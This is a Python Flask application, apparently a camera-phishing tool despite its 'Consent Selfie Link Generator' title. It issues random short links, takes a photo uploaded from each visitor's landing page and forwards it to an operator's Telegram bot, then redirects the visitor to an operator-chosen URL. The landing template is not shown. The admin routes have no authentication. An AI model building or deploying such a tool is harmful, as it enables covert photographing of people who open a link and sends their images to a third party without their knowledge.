from flask import Flask, request, render_template, redirect, url_for, jsonify, abort
from datetime import datetime
import os
import sqlite3
import secrets
import requests

APP_TITLE = "Consent Selfie Link Generator"
DB_PATH = os.environ.get("DB_PATH", "data.db")
SELF_BASE = os.environ.get("SELF_BASE", "")  # Optional: e.g., https://yourapp.onrender.com

app = Flask(__name__)

def db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = db()
    cur = conn.cursor()
    cur.execute("""
    CREATE TABLE IF NOT EXISTS configs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        bot_token TEXT NOT NULL,
        admin_chat_id TEXT NOT NULL,
        redirect_url TEXT NOT NULL,
        created_at TEXT NOT NULL
    )
    """)
    cur.execute("""
    CREATE TABLE IF NOT EXISTS links (
        slug TEXT PRIMARY KEY,
        config_id INTEGER NOT NULL,
        created_at TEXT NOT NULL,
        FOREIGN KEY (config_id) REFERENCES configs(id)
    )
    """)
    conn.commit()
    conn.close()

@app.before_first_request
def _start():
    init_db()

def current_config(conn):
    cur = conn.cursor()
    cur.execute("SELECT * FROM configs ORDER BY id DESC LIMIT 1")
    row = cur.fetchone()
    return row

@app.route("/")
def home():
    conn = db()
    conf = current_config(conn)
    links = conn.execute("SELECT slug, created_at FROM links ORDER BY created_at DESC LIMIT 50").fetchall()
    conn.close()
    return render_template("admin.html", conf=conf, links=links, app_title=APP_TITLE, self_base=SELF_BASE)

@app.route("/admin/save", methods=["POST"])
def admin_save():
    bot_token = request.form.get("bot_token","").strip()
    admin_chat_id = request.form.get("admin_chat_id","").strip()
    redirect_url = request.form.get("redirect_url","").strip()
    if not bot_token or not admin_chat_id or not redirect_url:
        return "All fields are required", 400
    conn = db()
    conn.execute(
        "INSERT INTO configs (bot_token, admin_chat_id, redirect_url, created_at) VALUES (?, ?, ?, ?)",
        (bot_token, admin_chat_id, redirect_url, datetime.utcnow().isoformat())
    )
    conn.commit()
    conn.close()
    return redirect(url_for("home"))

def generate_slug():
    alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    return "".join(secrets.choice(alphabet) for _ in range(7))

@app.route("/admin/new-link", methods=["POST"])
def admin_new_link():
    conn = db()
    conf = current_config(conn)
    if conf is None:
        conn.close()
        return "Please save a config first.", 400
    slug = generate_slug()
    conn.execute(
        "INSERT INTO links (slug, config_id, created_at) VALUES (?, ?, ?)",
        (slug, conf["id"], datetime.utcnow().isoformat())
    )
    conn.commit()
    conn.close()
    if SELF_BASE:
        full = f"{SELF_BASE}/l/{slug}"
    else:
        full = url_for("landing", slug=slug, _external=True)
    return jsonify({"slug": slug, "url": full})

@app.route("/l/<slug>")
def landing(slug):
    conn = db()
    row = conn.execute("SELECT * FROM links WHERE slug = ?", (slug,)).fetchone()
    if not row:
        conn.close()
        abort(404)
    conf = conn.execute("SELECT * FROM configs WHERE id = ?", (row["config_id"],)).fetchone()
    conn.close()
    return render_template("landing.html", slug=slug, redirect_url=conf["redirect_url"], app_title=APP_TITLE)

def send_to_telegram(bot_token: str, chat_id: str, photo_bytes: bytes, caption: str):
    url = f"https://api.telegram.org/bot{bot_token}/sendPhoto"
    files = {'photo': ('selfie.jpg', photo_bytes)}
    data = {'chat_id': chat_id, 'caption': caption}
    r = requests.post(url, files=files, data=data, timeout=20)
    return r.status_code, r.text

@app.route("/upload/<slug>", methods=["POST"])
def upload(slug):
    # Expecting a multipart form with 'photo' or a data URL in JSON {imageData: "data:image/jpeg;base64,...."}
    conn = db()
    link = conn.execute("SELECT * FROM links WHERE slug = ?", (slug,)).fetchone()
    if not link:
        conn.close()
        return jsonify({"ok": False, "error": "Invalid link"}), 404
    conf = conn.execute("SELECT * FROM configs WHERE id = ?", (link["config_id"],)).fetchone()
    conn.close()

    photo_bytes = None

    if "photo" in request.files:
        photo_bytes = request.files["photo"].read()
    else:
        try:
            js = request.get_json(force=True, silent=True) or {}
            data_url = js.get("imageData","")
            if data_url.startswith("data:image"):
                header, b64 = data_url.split(",", 1)
                import base64
                photo_bytes = base64.b64decode(b64)
        except Exception:
            pass

    if not photo_bytes:
        return jsonify({"ok": False, "error": "No image received"}), 400

    caption = f"Selfie received for slug {slug} at {datetime.utcnow().isoformat()}"
    try:
        code, resp = send_to_telegram(conf["bot_token"], conf["admin_chat_id"], photo_bytes, caption)
    except Exception as e:
        return jsonify({"ok": False, "error": f"Telegram send failed: {e}"}), 500

    if code != 200:
        return jsonify({"ok": False, "error": f"Telegram API error: {resp}"}), 502

    return jsonify({"ok": True, "redirect": conf["redirect_url"]})

@app.route("/health")
def health():
    return "ok", 200

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
